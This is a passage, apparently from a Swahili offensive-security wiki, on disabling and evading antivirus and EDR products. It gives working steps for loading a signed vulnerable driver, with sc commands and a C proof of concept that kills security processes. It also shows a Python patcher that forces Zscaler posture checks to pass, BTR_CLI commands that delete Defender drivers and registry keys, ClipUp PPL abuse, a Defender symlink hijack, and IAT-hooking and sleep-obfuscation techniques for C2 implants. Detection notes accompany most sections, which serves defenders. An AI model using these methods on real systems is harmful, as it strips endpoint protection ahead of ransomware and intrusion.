- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia utility ndogo ya console inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kudondosha ransomware. Zana hii huleta **driver yake yenye udhaifu lakini *iliyotiwa sahihi*** na kuitumia vibaya kutekeleza kernel operations zenye ruhusa za juu ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu
1. **Driver iliyotiwa sahihi**: Faili inayowasilishwa kwenye disk ni `ServiceMouse.sys`, lakini binary hiyo ni driver iliyotiwa sahihi kihalali, `AToolsKrnl64.sys`, kutoka “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa kuwa driver hiyo ina sahihi halali ya Microsoft, hupakiwa hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Usakinishaji wa service**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Mstari wa kwanza husajili driver kama **kernel service** na wa pili huiwasha ili `\\.\ServiceMouse` ipatikane kutoka user land.
3. **IOCTLs zinazotolewa na driver**
   | Msimbo wa IOCTL | Uwezo                                      |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Kusitisha process yoyote kwa PID (hutumika kuua huduma za Defender/EDR) |
   | `0x990000D0` | Kufuta faili yoyote kwenye diski |
   | `0x990001D0` | Kuondoa driver na kufuta service |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Kwa nini inafanya kazi**: BYOVD hupita kabisa ulinzi wa user-mode; msimbo unaotekelezwa kwenye kernel unaweza kufungua michakato *iliyolindwa*, kuisimamisha, au kuingilia objects za kernel bila kujali PPL/PP, ELAM au vipengele vingine vya hardening.

Kugundua / Kupunguza athari  
•  Washa orodha ya Microsoft ya kuzuia drivers zilizo hatarini (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.  
•  Fuatilia uundaji wa huduma mpya za *kernel* na utoe tahadhari driver inapopakiwa kutoka kwenye directory inayoweza kuandikiwa na kila mtu au haipo kwenye allow-list.  
•  Fuatilia handles za user-mode kwa custom device objects zikifuatwa na miito ya kutiliwa shaka ya `DeviceIoControl`.

### Kupita Ukaguzi wa Posture wa Zscaler Client Connector kwa Kurekebisha Binary Zilizo Kwenye Diski

**Client Connector** ya Zscaler hutumia sheria za device-posture ndani ya kifaa na hutegemea Windows RPC kuwasilisha matokeo kwa components nyingine. Chaguo mbili dhaifu za usanifu hufanya iwezekane kupita ukaguzi wote:

1. Tathmini ya posture hufanyika **upande wa client pekee** (boolean hutumwa kwa server).
2. Endpoints za ndani za RPC hukagua tu kwamba executable inayounganisha **imesainiwa na Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kurekebisha binaries nne zilizosainiwa kwenye diski**, mbinu zote mbili zinaweza kuzimwa:

| Binary | Mantiki ya awali iliyorekebishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila mara, hivyo kila ukaguzi huonyesha kuwa kifaa kinatii masharti |
| `ZSAService.exe` | Mwito usio wa moja kwa moja wa `WinVerifyTrust` | Huondolewa kwa NOP ⇒ mchakato wowote (hata ambao haujasainiwa) unaweza kuunganishwa na RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Hubadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Ukaguzi wa integrity wa tunnel | Hukatizwa |

Dondoo fupi la patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Baada ya kubadilisha faili asili na kuwasha upya stack ya huduma:

* **Ukaguzi wote** wa posture huonyesha **green/compliant**.
* Binaries zisizosainiwa au zilizorekebishwa zinaweza kufungua endpoints za named-pipe RPC (kwa mfano, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyodhibitiwa hupata ufikiaji usio na vizuizi wa mtandao wa ndani unaofafanuliwa na sera za Zscaler.

Uchunguzi huu wa tukio unaonyesha jinsi maamuzi ya uaminifu ya upande wa mteja pekee na ukaguzi rahisi wa sahihi vinavyoweza kushindwa kwa marekebisho machache ya byte.

## Matumizi mabaya ya utendaji unaoaminika wa Microsoft Defender `BTR.sys`

Driver ya Defender ya **Boot-Time Removal** ni mfano mzuri wa kulinganisha na BYOVD ya kawaida. `BTR.sys` ni sehemu halali ya kurekebisha mfumo, iliyosainiwa na Microsoft, isiyo na hitilafu ya uharibifu wa kumbukumbu wala interface ya IOCTL; badala yake, baada ya kupata ufikiaji wa msimamizi na `SeLoadDriverPrivilege`, mwendeshaji anaweza kughushi muamala wake binafsi wa kurekebisha mfumo na kupata ruhusa ya kufanya shughuli za faili/registry za Ring-0 zilizokusudiwa. Hii ni **primitive ya kuzima AV/EDR baada ya mfumo kuathiriwa, si ufikiaji wa awali au upandishaji wa marupurupu**, na driver inaweza kutolewa kutoka kwenye rasilimali ya `BOOTTIMETOOL` ya `MpEngine.dll` ya target yenyewe badala ya kuleta driver ya mtu mwingine inayoweza kuvutia macho.<sup>[[36]](#references)</sup>

### Kuweka driver ya matumizi ya mara moja

Kwa kawaida, Defender huweka rasilimali hiyo kama faili ya nasibu ya `[a-z]{8}.sys` na kusajili kernel service yenye jina linalofanana. `DriverEntry` husoma thamani ya `Args` ya service, hufungua NTFS ADS iliyorejelewa, husimbua na kuthibitisha orodha ya vitendo, huandika mrejesho, na kurudisha `0xC0000056` (`STATUS_DELETE_PENDING`) baada ya utekelezaji kufanikiwa ili driver ijiondoe badala ya kubaki ikiendelea kufanya kazi. Service ghushi huwa na thamani bainifu zifuatazo.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Mt stream ya `:changelist` ina blob moja iliyosimbwa kwa RC4. Builds zilizochanganuliwa hutumia tena key isiyobadilika ya baiti 256, kwa hivyo usimbaji fiche si kizuizi cha uidhinishaji. Plaintext halali ina header ya kimataifa ya baiti 24 (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC ya header na transaction ID inayotokana na payload), ikifuatiwa na njia ya feedback ya UTF-16 inayomalizika kwa null na idadi yoyote ya vipengee. Kila kipengee kina header ya baiti 16 (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) pamoja na data mahususi ya kitendo inayoishia kwa **baiti NUL nne haswa**. Kila eneo la header/data hukaguliwa kivyake kwa kutumia CRC-32 polynomial `0xEDB88320`, hali ya mwanzo `0xFFFFFFFF`, na **bila XOR ya mwisho** (`~CRC32`); hali ya CRC huwekwa upya kwa kila eneo.<sup>[[36]](#references)[[37]](#references)</sup>

Vitambulisho vya vitendo vinavyokubaliwa huwezesha primitives hizi za kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Data ya kipengee | Matokeo |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Futa faili, ikijumuisha faili iliyofungwa |
| 2 | `[UTF-16 path]` | Ondoa directory tupu |
| 3 | `[Flags][source][destination]` | Hamisha faili hadi kwenye njia iliyolindwa iliyochaguliwa na mshambuliaji; destination tupu humaanisha kufuta |
| 4 | `[Flags][key path]` | Futa ufunguo wa registry kwa kujirudia |
| 5 | `[Flags][key path + "\\" + value]` | Futa thamani ya registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Unda/sasisha thamani ya registry na uunde njia za ufunguo ambazo hazipo |

Kwa vitendo vya 5 na 6, kitenganishi cha ufunguo/thamani kwenye wire ni **backslash mbili mfululizo**; njia iliyopangwa kwa muundo wa kawaida haitagawanywa ipasavyo. Faili ya feedback kwa kiasi kikubwa huakisi ombi, lakini baiti nne za kwanza za data ya kila kipengee huwa `NTSTATUS` yake ya matokeo. Kwa vitendo vya 1 na 2, ambavyo havina sehemu ya flags mwanzoni, BTR huhamisha njia hadi kwenye baiti nne zilizohifadhiwa mwishoni ili kutoa nafasi ya status hiyo.<sup>[[36]](#references)</sup>

### Mchakato wa `BTR_CLI` na kipindi cha mapema cha boot

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) hutekeleza mnyororo mzima: kutoa `BTR.sys` kutoka kwa Defender ya ndani, kuunda `<random>.sys:changelist` na stream ya feedback, kusaralisha/kukokotoa checksum/kusimba vitendo vilivyounganishwa, kuunda moja kwa moja ufunguo wa registry wa service, kisha kuita `NtLoadDriver` kwa `-trigger now` au kuiacha kama driver ya system-start kwa `-trigger boot`. Kuweka maandalizi moja kwa moja kwenye registry huepuka njia ya kawaida ya SCM `CreateServiceW` na kwa hivyo **hakusababishi** Event ID 7045 ya usakinishaji wa service. Vifaa vilivyoanzishwa na boot vinaweza kuondolewa baadaye kwa kutumia `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` haiwezi kutumika kwa sababu BTR hufanya shughuli za faili kutoka `DriverEntry` kabla storage stack na kiungo cha `SystemRoot` kuwa tayari. `Start=1` pamoja na kundi la kipaumbele cha juu la `Boot Bus Extender` badala yake huendesha katika Phase 1: NTFS inaweza kutumika, lakini drivers nyingi za usalama za system-start na huduma za EDR za user-mode bado hazijaanzishwa. Filters za boot-start kama `WdFilter` huenda tayari zimepakiwa, lakini BTR inaweza kuondoa binary zao au usanidi wa huduma kabla ya kuwasha tena, na inaweza kufuta executable za huduma kabla SCM haijazizindua. ELAM haizibi pengo hili kwa sababu BTR huendesha baada ya tathmini ya boot-start na ina signature halali ya Microsoft.<sup>[[36]](#references)</sup>

Vitendo vingi huendeshwa katika transaction moja. PoC huweka Action 1 mwanzoni kwa `\SystemRoot\Temp\BootClean.log` yenye njia iliyowekwa moja kwa moja: BTR huunda log hii, kisha hutekeleza ombi lake yenyewe la kuifuta na kuiondoa kabla ya kujiondoa. Hii hupunguza ushahidi, huku kuweka maoni katika `<random>.sys:<random>.dat` kukiruhusu kuondoa driver na streams zote mbili pamoja.<sup>[[36]](#references)[[37]](#references)</sup>

### Ulinganishaji wa matukio yenye ishara kubwa ya hatari

Sheria zinazotegemea signature pekee na orodha ya Microsoft ya kuzuia vulnerable driver hazikabili matumizi mabaya ya utendaji uliokusudiwa wa BTR. Pendelea ulinganishaji huu wa kitabia, huku ukitofautisha lineage halali ya Defender na launcher isiyojulikana.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Kuundwa kwa `.sys:changelist` ni jambo la kawaida kwa staging ya BTR. ADS ya `.dat` iliyoambatishwa kwenye `.sys` hiyo hiyo inatia shaka zaidi, kwa sababu Defender halali kwa kawaida huweka feedback chini ya `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bila System 7045:** Linganisha uundaji wa moja kwa moja wa `HKLM\SYSTEM\CurrentControlSet\Services\<random>` ulio na `Args=...:changelist` na `Group=Boot Bus Extender` na kutokuwepo kwa tukio linalolingana la usakinishaji wa SCM.
- **Sysmon 6 -> 23:** Linganisha upakiaji wa driver inayojulikana ya BTR kutoka lineage isiyo ya Defender na ufutaji wa faili unaofuata unaohusishwa na `System`/PID 4, hasa kwa binary za usalama.
- **Sysmon 11 -> 23:** Toa tahadhari faili `\SystemRoot\Temp\BootClean.log` inapoundwa na kufutwa haraka na `System`/PID 4.
- Zuia na kagua ugawaji/uwezeshaji wa `SeLoadDriverPrivilege`; signature ya Microsoft pekee haitoshi kuthibitisha uaminifu pale driver ya zana ya usalama inapowekwa staging na `cmd.exe`, PowerShell, au process isiyojulikana.

## Kutumia Vibaya Protected Process Light (PPL) Kuhujumu AV/EDR kwa LOLBINs

Protected Process Light (PPL) hutekeleza mpangilio wa signer/level ili processes zilizolindwa tu zenye kiwango sawa au cha juu ziweze kuhujumiana. Kwa upande wa mashambulizi, ikiwa unaweza kuzindua kihalali binary iliyowezeshwa kwa PPL na kudhibiti arguments zake, unaweza kubadili utendaji usio na madhara (kwa mfano, logging) kuwa primitive yenye vikwazo ya kuandika, inayotumia PPL, dhidi ya directories zilizolindwa zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Kinachofanya process iendeshe kama PPL
- EXE inayolengwa (na DLL zozote zilizopakiwa) lazima ziwe na signature yenye EKU inayoweza kutumia PPL.
- Process lazima iundwe kwa CreateProcess kwa kutumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Lazima iombwe protection level inayooana na signer wa binary (kwa mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa signers wa anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa signers wa Windows). Viwango visivyo sahihi vitasababisha uundaji kushindwa.

Tazama pia utangulizi mpana zaidi wa PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Zana za launcher
- Kisaidizi cha open-source: CreateProcessAsPPL (huchagua protection level na kupeleka arguments kwa EXE inayolengwa):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Muundo wa matumizi:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` hujizindua yenyewe na hukubali kigezo cha kuandika faili ya logi kwenye njia iliyobainishwa na mtumiaji.
- Inapozinduliwa kama mchakato wa PPL, faili huandikwa chini ya ulinzi wa PPL.
- ClipUp haiwezi kuchanganua njia zenye nafasi; tumia njia fupi za 8.3 kuelekeza kwenye maeneo ambayo kwa kawaida yamelindwa.

8.3 short path helpers
- Orodhesha majina mafupi: `dir /x` katika kila saraka kuu.
- Pata njia fupi katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Zindua LOLBIN inayoweza kutumia PPL (ClipUp) kwa `CREATE_PROTECTED_PROCESS` ukitumia launcher (kwa mfano, CreateProcessAsPPL).
2) Pitisha kigezo cha njia ya logi ya ClipUp ili kulazimisha uundaji wa faili katika saraka ya AV iliyolindwa (kwa mfano, Defender Platform). Tumia majina mafupi ya 8.3 inapohitajika.
3) Ikiwa AV kwa kawaida hufungua/kufunga binary lengwa inapokuwa inaendesha (kwa mfano, MsMpEng.exe), panga uandishi wakati wa boot, kabla AV haijaanza, kwa kusakinisha huduma ya kujianzisha kiotomatiki ambayo huendeshwa mapema zaidi kwa uhakika. Thibitisha mpangilio wa boot kwa Process Monitor (boot logging).
4) Baada ya kuwasha upya, uandishi unaotumia PPL hufanyika kabla AV haijafunga binary zake, na hivyo kuharibu faili lengwa na kuzuia kuanza kwake.

Mfano wa matumizi (njia zimefichwa/kufupishwa kwa usalama):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Vidokezo na vikwazo
- Huwezi kudhibiti maudhui ambayo ClipUp huandika, bali eneo pekee; primitive hii inafaa kwa kuharibu data badala ya kuingiza maudhui mahususi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na muda wa kuwasha upya.
- Muda ni muhimu: faili lengwa haipaswi kuwa limefunguliwa; utekelezaji wakati wa kuwasha huepusha file locks.

Utambuzi
- Uundaji wa process ya `ClipUp.exe` yenye arguments zisizo za kawaida, hasa ikiwa process ya mzazi ni launcher isiyo ya kawaida, karibu na wakati wa kuwasha.
- Services mpya zilizowekwa kuwasha binaries zinazotia shaka kiotomatiki na zinazoanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya hitilafu za kuanzisha Defender.
- Ufuatiliaji wa uadilifu wa faili kwenye binaries/directories za Platform za Defender; uundaji/urekebishaji usiotarajiwa wa faili na processes zilizo na protected-process flags.
- Telemetry ya ETW/EDR: tafuta processes zilizoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Hatua za kupunguza
- WDAC/Code Integrity: weka vizuizi kwa binaries zilizotiwa saini zinazoweza kuendeshwa kama PPL na kwa wazazi wanaoruhusiwa; zuia matumizi ya ClipUp nje ya mazingira halali.
- Usimamizi wa service: zuia uundaji/urekebishaji wa services zinazojiwasha kiotomatiki na fuatilia udanganyifu wa mpangilio wa kuanzishwa.
- Hakikisha ulinzi dhidi ya tampering wa Defender na ulinzi wa early-launch umewashwa; chunguza hitilafu za uanzishaji zinazoashiria uharibifu wa binary.
- Fikiria kuzima uundaji wa majina mafupi ya 8.3 kwenye volumes zinazohifadhi zana za usalama ikiwa hilo linaendana na mazingira yako (fanya majaribio kwa kina).

## Kuhujumu Microsoft Defender kupitia Symlink Hijack ya Folda ya Toleo la Platform

Windows Defender huchagua platform itakayotumia kwa kuorodhesha subfolders zilizo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua subfolder yenye mfuatano wa toleo wa lexicographic ulio juu zaidi (kwa mfano, `4.18.25070.5-0`), kisha huanzisha processes za service za Defender kutoka hapo (husasisha njia za service/registry ipasavyo). Uteuzi huu huamini maingizo ya directory, yakiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye path inayoweza kuandikwa na mshambuliaji na kufanikisha DLL sideloading au kuvuruga service.<sup>[[21]](#references)[[22]](#references)</sup>

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks chini ya folda ya Platform)
- Uwezo wa kuwasha upya au kusababisha uteuzi upya wa Defender platform (service huanzishwa upya wakati wa kuwasha)
- Zana zilizojengewa ndani pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia uandishi kwenye folda zake yenyewe, lakini uteuzi wake wa platform huamini maingizo ya directory na kuchagua toleo la lexicographic lililo juu zaidi bila kuthibitisha kuwa lengwa linaelekeza kwenye path iliyolindwa/kuaminiwa.

Hatua kwa hatua (mfano)
1) Andaa nakala inayoweza kuandikiwa ya folda ya sasa ya platform, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda directory symlink ya toleo la juu zaidi ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (reboot inapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kuwa MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa upya:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya process chini ya `C:\TMP\AV\` na usanidi wa service/registry ukionyesha eneo hilo.

Chaguo za post-exploitation
- DLL sideloading/code execution: Weka/replace DLL ambazo Defender hupakia kutoka kwenye saraka ya programu yake ili kutekeleza code kwenye processes za Defender. Tazama sehemu iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili kwenye uanzishaji unaofuata njia iliyosanidiwa isitatuliwe na Defender ishindwe kuwaka:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Kumbuka kwamba mbinu hii yenyewe haitoi privilege escalation; inahitaji haki za admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Timu za red team zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuiweka ndani ya target module yenyewe kwa ku-hook Import Address Table (IAT) yake na kuelekeza API zilizochaguliwa kupitia code inayodhibitiwa na mshambuliaji, isiyotegemea mahali ilipopakiwa (PIC). Hii huongeza wigo wa evasion zaidi ya API chache zinazotolewa na kits nyingi (k.m., CreateProcessA), na kupanua ulinzi huohuo kwa BOFs na post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Mbinu ya jumla
- Weka PIC blob pamoja na target module kwa kutumia reflective loader (iliyowekwa mwanzoni au kama companion). PIC lazima ijitosheleze na isitegemee mahali ilipopakiwa.
- Host DLL inapopakiwa, pitia IMAGE_IMPORT_DESCRIPTOR yake na urekebishe IAT entries za imports lengwa (k.m., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ili zielekeze kwenye PIC wrappers nyepesi.
- Kila PIC wrapper hutekeleza evasion kabla ya kuita API halisi kwa tail-call. Evasion za kawaida ni pamoja na:
  - Kuficha/kufichua memory wakati wa mzunguko wa call (k.m., kusimba beacon regions, kubadili RWX→RX, kubadilisha majina/ruhusa za pages), kisha kurejesha hali yake baada ya call.
  - Call-stack spoofing: tengeneza stack isiyo na shaka na uhamie kwenye target API ili call-stack analysis ipate frames zinazotarajiwa.<sup>[[9]](#references)</sup>
- Kwa uoanifu, toa interface ili Aggressor script (au inayolingana nayo) iweze kusajili API zitakazo-hookiwa kwa Beacon, BOFs na post-ex DLLs.

Kwa nini utumie IAT hooking hapa
- Hufanya kazi kwa code yoyote inayotumia import iliyo-hookiwa, bila kurekebisha code ya tool au kutegemea Beacon ku-proxy API mahususi.
- Hujumuisha post-ex DLLs: ku-hook LoadLibrary* hukuwezesha kunasa upakiaji wa modules (k.m., System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hizohizo kwenye API calls zake.
- Hurejesha matumizi ya kuaminika ya post-ex commands zinazozindua processes dhidi ya detections zinazotegemea call-stack, kwa ku-wrap CreateProcessA/W.

Mchoro mdogo wa IAT hook (pseudocode ya x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Vidokezo
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr huonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ndogo na salama kwa PIC; pata API halisi kupitia thamani ya awali ya IAT uliyonasa kabla ya kupatch, au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na uepuke kuacha kurasa zenye ruhusa za kuandika na kutekeleza kwa wakati mmoja.

Call-stack spoofing stub
- PIC stubs za mtindo wa Draugr huunda mnyororo bandia wa miito (return addresses zinazoelekeza ndani ya modules zisizo na madhara) kisha huelekeza mtiririko kwenye API halisi.
- Hii hushinda detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs zinapoita APIs nyeti.
- Ziunganishe na mbinu za stack cutting/stack stitching ili kufika ndani ya frames zinazotarajiwa kabla ya prologue ya API.

Ujumuishaji wa kiutendaji
- Weka reflective loader kabla ya DLL za post-ex ili PIC na hooks zianzishe kiotomatiki wakati DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zinufaike kwa uwazi na njia ileile ya evasion bila mabadiliko ya code.

Mazingatio ya Detection/DFIR
- Uadilifu wa IAT: entries zinazoelekeza kwenye anwani zisizo za image (heap/anon); uthibitishaji wa mara kwa mara wa import pointers.
- Hitilafu za Stack: return addresses zisizohusiana na images zilizopakiwa; mabadiliko ya ghafla kuelekea PIC isiyo ya image; ukoo usiolingana wa RtlUserThreadStart.
- Telemetry ya Loader: maandishi ya ndani ya mchakato kwenye IAT, shughuli za mapema za DllMain zinazorekebisha import thunks, maeneo ya RX yasiyotarajiwa yanayoundwa wakati wa upakiaji.
- Kukwepa Image-load: ikiwa unahook LoadLibrary*, fuatilia upakiaji unaotiliwa shaka wa automation/clr assemblies unaohusiana na matukio ya kuficha memory.

Vipengele vya msingi na mifano inayohusiana
- Reflective loaders zinazofanya IAT patching wakati wa upakiaji (k.m., TitanLdr, AceLdr)
- Memory masking hooks (k.m., simplehook) na stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (k.m., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks kupitia PICO inayosalia

Ikiwa unadhibiti reflective loader, unaweza kuhook imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya `GetProcAddress` ya loader na resolver maalum inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Tengeneza **resident PICO** (persistent PIC object) inayosalia baada ya PIC ya loader ya muda kujiondoa.
- Export function ya `setup_hooks()` inayobadilisha import resolver ya loader (k.m., `funcs.GetProcAddress = _GetProcAddress`).
- Katika `_GetProcAddress`, ruka ordinal imports na utumie utafutaji wa hook unaotegemea hash kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; la sivyo, elekeza ombi kwa `GetProcAddress` halisi.
- Sajili hook targets wakati wa link kwa entries za Crystal Palace `addhook "MODULE$Func" "hook"`. Hook hubaki halali kwa sababu iko ndani ya resident PICO.

Hii hutoa **uelekezaji upya wa IAT wakati wa import** bila kupatch code section ya DLL iliyopakiwa baada ya upakiaji.

### Kulazimisha imports zinazoweza kuhookiwa wakati target inatumia PEB-walking

Import-time hooks huchochewa tu ikiwa function imo kwenye IAT ya target. Ikiwa module inatatua APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili njia ya `ProcessImports()` ya loader iione:

- Badilisha utatuzi wa hashed export (k.m., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na rejeleo la moja kwa moja kama `&WaitForSingleObject`.
- Compiler hutoa IAT entry, inayowezesha interception wakati reflective loader inatatua imports.

### Sleep/idle obfuscation ya mtindo wa Ekko bila kupatch `Sleep()`

Badala ya kupatch `Sleep`, hook **primitives halisi za wait/IPC** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, funga mwito ndani ya mnyororo wa obfuscation wa mtindo wa Ekko unaosimba kwa njia fiche image iliyo kwenye memory wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kuratibu mfuatano wa callbacks zinazoita `NtContinue` zikiwa na `CONTEXT` frames zilizotayarishwa.
- Mnyororo wa kawaida (x64): weka image kuwa `PAGE_READWRITE` → isimba kwa RC4 kupitia `advapi32!SystemFunction032` kwenye image nzima iliyomapishwa → tekeleza wait inayozuia → ifichue kwa RC4 → **rejesha ruhusa za kila section** kwa kupitia PE sections → toa ishara ya kukamilika.
- `RtlCaptureContext` hutoa `CONTEXT` ya kiolezo; inakiliwe kwenye frames nyingi na registers (`Rip/Rcx/Rdx/R8/R9`) ziwekwe ili kuita kila hatua.

Maelezo ya kiutendaji: rudisha “success” kwa waits ndefu (k.m., `WAIT_OBJECT_0`) ili caller iendelee wakati image imefichwa. Muundo huu huficha module dhidi ya scanners wakati wa vipindi vya idle na huepuka saini ya kawaida ya “patched `Sleep()`”.

Mawazo ya Detection (yanayotegemea telemetry)
- Msururu wa callbacks za `CreateTimerQueueTimer` zinazoelekeza kwenye `NtContinue`.
- Matumizi ya `advapi32!SystemFunction032` kwenye buffers kubwa zilizo mfululizo na zenye ukubwa wa image.
- `VirtualProtect` ya range kubwa ikifuatiwa na urejeshaji maalum wa ruhusa za kila section.

### Usajili wa CFG wakati wa runtime kwa sleep-obfuscation gadgets

Kwenye targets zenye CFG, indirect jump ya kwanza kwenda kwenye gadget iliyo katikati ya function, kama `jmp [rbx]` au `jmp rdi`, kwa kawaida itasababisha mchakato ku-crash kwa `STATUS_STACK_BUFFER_OVERRUN` kwa sababu gadget haipo kwenye metadata ya CFG ya module. Ili kuweka minyororo ya mtindo wa Ekko/Kraken ikifanya kazi ndani ya michakato iliyoimarishwa:<sup>[[30]](#references)</sup>

